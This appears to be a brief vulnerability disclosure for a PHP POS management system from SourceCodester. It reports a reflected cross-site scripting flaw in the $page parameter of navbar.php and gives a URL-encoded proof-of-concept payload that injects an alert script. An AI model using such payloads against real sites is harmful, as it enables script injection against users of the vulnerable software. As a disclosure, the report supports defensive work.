vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16127/best-pos-management-system-php.html

Vulnerability trigger parameter: $page

The process of vulnerability discovery is as follows：

![image-20230223221020985](C:\markdown\images\image-20230223221020985.png)

exp

```
http://192.168.31.50/kruxton/navbar.php?page=%27%3E%3C/script%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E
```

![image-20230223220951244](C:\markdown\images\image-20230223220951244.png)